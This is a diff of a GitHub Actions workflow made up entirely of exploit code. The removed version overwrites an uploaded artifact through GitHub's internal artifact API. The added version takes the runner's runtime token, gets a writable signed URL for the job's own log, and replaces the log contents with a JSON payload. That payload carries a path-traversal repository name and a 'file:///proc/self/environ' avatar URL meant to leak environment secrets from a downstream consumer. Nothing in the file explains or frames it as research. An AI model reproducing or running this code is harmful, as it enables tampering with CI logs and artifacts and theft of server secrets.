@@ -1,72 +1,72 @@
-name: Cassette
+name: Cassette Log
 on:
   push:
   workflow_dispatch:
+permissions:
+  actions: read
+  contents: read
 jobs:
-  upload:
+  capture:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/setup-node@v4
-        with:
-          node-version: '24'
       - uses: actions/github-script@v8
         with:
           script: |
-            for (const key of ['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RESULTS_URL']) {
-              core.setSecret(process.env[key]);
-              core.exportVariable(key, process.env[key]);
-            }
-      - name: Probe artifact versions
-        run: |
-          npm install @actions/artifact@6.3.1
-          node --input-type=module <<'JS'
-          import { Readable } from 'node:stream';
-          import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
-          import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
-          import { uploadToBlobStorage } from './node_modules/@actions/artifact/lib/internal/upload/blob-upload.js';
-          import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
-          const client=internalArtifactTwirpClient(), ids=getBackendIdsFromToken();
-          for(const version of [0,5,6]) {
-            const name=`probe-version-${version}.json`;
-            try {
-              const c=await client.CreateArtifact({...ids,name,version});
-              const u=await uploadToBlobStorage(c.signedUploadUrl,Readable.from([Buffer.from('{}')]),'\u0085application/json');
-              const f=await client.FinalizeArtifact({...ids,name,size:String(u.uploadSize)});
-              console.log('ACCEPT_VERSION',version,String(f.artifactId));
-            } catch(e) { console.log('REJECT_VERSION',version,String(e.message).slice(-120)); }
-          }
-          JS
-      - name: Publish test artifact
-        run: |
-          npm install @actions/artifact@6.3.1
-          node --input-type=module <<'JS'
-          import { Readable } from 'node:stream';
-          import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
-          import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
-          import { uploadToBlobStorage } from './node_modules/@actions/artifact/lib/internal/upload/blob-upload.js';
-          import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
-          const repo = process.env.GITHUB_REPOSITORY;
-          const ids = getBackendIdsFromToken();
-          const client = internalArtifactTwirpClient();
-          const name = 'legacy.zip';
-          const type = '\u0085application/json';
-          const created = await client.CreateArtifact({
-            ...ids, name, version:4
-          });
-          if (!created.ok) throw Error('CreateArtifact failed');
-          const initial = Buffer.from('{"full_name":"placeholder","owner":{"login":"x","avatar_url":"https://example.com"}}');
-          const first = await uploadToBlobStorage(created.signedUploadUrl, Readable.from([initial]), type);
-          const finalized = await client.FinalizeArtifact({
-            ...ids, name, size:String(first.uploadSize),
-            hash:StringValue.create({value:`sha256:${first.sha256Hash}`})
-          });
-          if (!finalized.ok) throw Error('FinalizeArtifact failed');
-          const id = String(finalized.artifactId);
-          const path = `x/../../repos/${repo}/actions/artifacts/${id}/zip`;
-          const payload = JSON.stringify({
-            full_name:path, owner:{login:'x',avatar_url:'file:///proc/self/environ'}
-          });
-          await uploadToBlobStorage(created.signedUploadUrl, Readable.from([Buffer.from(payload)]), type);
-          console.log(`REPOSITORY=${path}`);
-          console.log(`ARTIFACT_ID=${id}`);
-          JS
+            const fs = require('fs');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
+            const scope = jwt.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
+            const [, workflow_run_backend_id, workflow_job_run_backend_id] = scope.split(':');
+            const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
+            const response = await fetch(base + '/twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL', {
+              method: 'POST',
+              headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
+              body: JSON.stringify({workflow_run_backend_id, workflow_job_run_backend_id}),
+            });
+            const result = await response.json();
+            if (!response.ok || !result.logs_url) throw Error(`Log URL lookup failed: ${response.status}, keys=${Object.keys(result)}`);
+            fs.writeFileSync('log-sas.txt', result.logs_url);
+            console.log('Job log URL acquired; SAS permissions:', new URL(result.logs_url).searchParams.get('sp'));
+      - uses: actions/upload-artifact@v4
+        with:
+          name: log-sas
+          path: log-sas.txt
+          retention-days: 1
+  mutate:
+    needs: capture
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: log-sas
+      - uses: actions/github-script@v8
+        with:
+          script: |
+            const fs = require('fs');
+            const {data} = await github.rest.actions.listJobsForWorkflowRun({
+              ...context.repo, run_id: context.runId
+            });
+            const job = data.jobs.find(x => x.name === 'capture');
+            if (!job) throw Error('Capture job not found');
+            const path = `x/../../repos/${context.repo.owner}/${context.repo.repo}/actions/jobs/${job.id}/logs`;
+            const payload = JSON.stringify({
+              full_name: path, owner: {login: 'x', avatar_url: 'file:///proc/self/environ'}
+            });
+            const sas = fs.readFileSync('log-sas.txt', 'utf8').trim();
+            const reset = await fetch(sas, {
+              method: 'PUT',
+              headers: {'x-ms-blob-type': 'AppendBlob', 'x-ms-version': '2025-11-05',
+                        'x-ms-blob-content-type': 'text/plain', 'Content-Length': '0'},
+              body: ''
+            });
+            if (!reset.ok) throw Error('Reset failed: ' + reset.status + ' ' + await reset.text());
+            const url = new URL(sas);
+            url.searchParams.set('comp', 'appendblock');
+            const append = await fetch(url, {
+              method: 'PUT',
+              headers: {'x-ms-version': '2025-11-05', 'Content-Length': String(Buffer.byteLength(payload))},
+              body: payload
+            });
+            if (!append.ok) throw Error('Append failed: ' + append.status + ' ' + await append.text());
+            console.log(`REPOSITORY=${path}`);
+            console.log(`JOB_ID=${job.id}`);
